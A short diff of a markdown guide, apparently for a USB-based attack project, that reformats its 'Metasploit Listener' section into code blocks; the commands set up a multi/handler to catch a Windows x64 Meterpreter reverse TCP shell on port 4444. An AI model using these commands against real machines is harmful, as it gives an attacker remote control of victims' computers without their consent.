@@ -25,15 +25,21 @@ python -m http.server 8888
 
 ## Metasploit Listener
 
-The following is a sequence of commands to be run. This will prepare you to receive the reverse shell. Make sure to replace `0.0.0.0` with your IP.
+Start metasploit by running the following command.
 
-- `msfconsole`
-- `use exploit/multi/handler`
-- `set payload windows/x64/meterpreter_reverse_tcp`
-- `setg LHOST 0.0.0.0`
-- `setg LPORT 4444`
-- `exploit`
+```
+msfconsole
+```
 
+The following is a sequence of commands to be run once metasploit is loaded. They will prepare you to receive the reverse shell. Make sure to replace `0.0.0.0` with your IP.
+
+```
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_tcp
+setg LHOST 0.0.0.0
+setg LPORT 4444
+exploit
+```
 
 ## Programming USB
 
